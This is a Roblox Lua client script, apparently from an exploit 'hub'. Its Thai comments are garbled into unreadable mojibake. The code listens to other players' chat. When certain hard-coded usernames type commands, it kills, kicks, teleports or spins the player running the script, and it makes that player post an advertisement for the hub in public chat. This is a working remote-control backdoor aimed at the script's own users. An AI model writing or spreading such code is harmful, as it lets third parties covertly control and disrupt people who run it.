local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local targetName = "birdV2_123"
local rotating = false
local angle = 0
local radius = 10
local speed = 3 -- ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏´‡∏°‡∏∏‡∏ô

--== ‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 1 : ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô ==--

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏Ü‡πà‡∏≤‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£
local function killPlayer(plr)
	if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
		plr.Character.Humanoid.Health = 0
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏ï‡∏∞‡∏≠‡∏≠‡∏Å‡∏à‡∏≤‡∏Å‡πÄ‡∏Å‡∏°
local function kickPlayer(plr)
	if plr == game.Players.LocalPlayer then
		game.Players.LocalPlayer:Kick("‡πÇ‡∏î‡∏ô‡πÅ‡∏ö‡∏ô‡∏•‡∏∞")
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏î‡∏∂‡∏á‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡∏°‡∏≤‡∏´‡∏≤‡∏ï‡∏±‡∏ß‡∏Ñ‡∏ô‡∏û‡∏¥‡∏°‡∏û‡πå
local function pullToSpeaker(speaker, targetPlr)
	if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
	and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
		targetPlr.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(0,2,0)
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÑ‡∏õ RBXGeneral
local function checkMessage()
	local TextChatService = game:GetService("TextChatService")
	local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
	if channel then
		channel:SendAsync("‡∏ú‡∏°‡πÉ‡∏ä‡πâTOU HUBüéâ")
	else
		warn("‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÅ‡∏ä‡∏ô‡πÄ‡∏ô‡∏• RBXGeneral")
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏•‡πà‡∏ô‡πÄ‡∏û‡∏•‡∏á
local function playMusic()
	local args = {"134647289919930"}
	local radio = workspace:FindFirstChild("DRadio_Script")
	if radio and radio:FindFirstChild("Event") then
		radio.Event:FireServer(unpack(args))
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏´‡∏°‡∏∏‡∏ô
local function startRotating(targetChar)
	if rotating then return end
	rotating = true
	playMusic()
	RunService.Heartbeat:Connect(function(dt)
		if rotating and targetChar and targetChar:FindFirstChild("HumanoidRootPart") 
		and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			angle = angle + speed * dt
			local x = math.cos(angle) * radius
			local z = math.sin(angle) * radius
			local targetPos = targetChar.HumanoidRootPart.Position
			LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(x,0,z), targetPos)
		end
	end)
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏´‡∏¢‡∏∏‡∏î‡∏´‡∏°‡∏∏‡∏ô
local function stopRotating()
	rotating = false
end

--== ‡∏£‡∏≤‡∏¢‡∏ä‡∏∑‡πà‡∏≠‡∏Ñ‡∏ô‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏û‡∏¥‡πÄ‡∏®‡∏© ==--
local specialUsers = {
	["birdV2_123"] = true,
	["maidjab1_174"] = true,
	["zerom_12y"] = true,
	["HRdrluOs1416"] = true -- ‚úÖ ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡πÄ‡∏ó‡πà‡∏≤‡∏Å‡∏±‡∏ö bird
}

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏ä‡πá‡∏Ñ‡∏ß‡πà‡∏≤ speaker ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÉ‡∏™‡πà target ‡πÑ‡∏î‡πâ‡πÑ‡∏´‡∏°
local function canAffect(speaker, target)
	-- ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ HRdrluOs1416 ‡∏™‡πà‡∏á‡∏ú‡∏•‡∏ï‡πà‡∏≠ birdV2_123
	if speaker.Name == "HRdrluOs1416" and target.Name == "birdV2_123" then
		return false
	end

	-- ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ maidjab1_174 ‡∏´‡∏£‡∏∑‡∏≠ zerom_12y ‡∏™‡πà‡∏á‡∏ú‡∏•‡∏ï‡πà‡∏≠ HRdrluOs1416
	if (speaker.Name == "maidjab1_174" or speaker.Name == "zerom_12y") and target.Name == "HRdrluOs1416" then
		return false
	end

	-- ‡∏Å‡∏£‡∏ì‡∏µ‡∏≠‡∏∑‡πà‡∏ô ‡πÜ ‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡∏ï‡∏≤‡∏°‡∏õ‡∏Å‡∏ï‡∏¥
	return true
end

--== ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏û‡∏¥‡πÄ‡∏®‡∏© ==--
_G.HandleExtraCommands = function(speaker, msg, LocalPlayer, specialUsers)
	local lowerMsg = string.lower(msg)

	-- ‚úÖ kill ALL
	if lowerMsg == "kill all" then
		if LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
			killPlayer(LocalPlayer)
		end

	-- ‚úÖ kill NAME
	elseif string.sub(lowerMsg,1,5) == "kill " then
		local targetName = string.sub(msg,6)
		if LocalPlayer.Name == targetName and LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
			killPlayer(LocalPlayer)
		end

	-- ‚úÖ ‡πÄ‡∏ï‡∏∞ NAME (‡πÄ‡∏â‡∏û‡∏≤‡∏∞ birdV2_123 ‡πÅ‡∏•‡∏∞ HRdrluOs1416 ‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ)
	elseif string.sub(msg,1,4) == "‡πÄ‡∏ï‡∏∞ " and (speaker.Name == "birdV2_123" or speaker.Name == "HRdrluOs1416") then
		local targetName = string.sub(msg,5)
		if LocalPlayer.Name == targetName and LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
			kickPlayer(LocalPlayer)
		end

	-- ‚úÖ ‡∏î‡∏∂‡∏á
	elseif lowerMsg == "‡∏î‡∏∂‡∏á" and specialUsers[speaker.Name] then
		if LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
			pullToSpeaker(speaker, LocalPlayer)
		end

	-- ‚úÖ ‡πÄ‡∏ä‡πá‡∏Ñ
	elseif lowerMsg == "‡πÄ‡∏ä‡πá‡∏Ñ" and specialUsers[speaker.Name] then
		if LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
			checkMessage()
		end
	end
end
--== ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÅ‡∏ä‡∏ó ==--
local function onCommand(plr, msg)
	-- ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö‡∏Å‡∏±‡∏ö‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á
	if plr == LocalPlayer then return end  

	-- ‚úÖ ‡∏´‡∏°‡∏∏‡∏ô‡∏£‡∏≠‡∏ö bird
	if msg == "1" and plr.Name == targetName then
		if LocalPlayer.Name ~= targetName then
			local target = plr.Character or plr.CharacterAdded:Wait()
			startRotating(target)
		end

	elseif msg == "stop1" and plr.Name == targetName then
		stopRotating()

	else
		-- ‡∏™‡πà‡∏á‡πÑ‡∏õ‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£‡∏ï‡πà‡∏≠ (‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 1)
		_G.HandleExtraCommands(plr, msg, LocalPlayer, specialUsers)
	end
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡∏≤‡∏£‡∏û‡∏¥‡∏°‡∏û‡πå
local function hookPlayer(plr)
	plr.Chatted:Connect(function(msg)
		onCommand(plr, msg)
	end)
end

Players.PlayerAdded:Connect(hookPlayer)
for _,p in ipairs(Players:GetPlayers()) do
	hookPlayer(p)
end
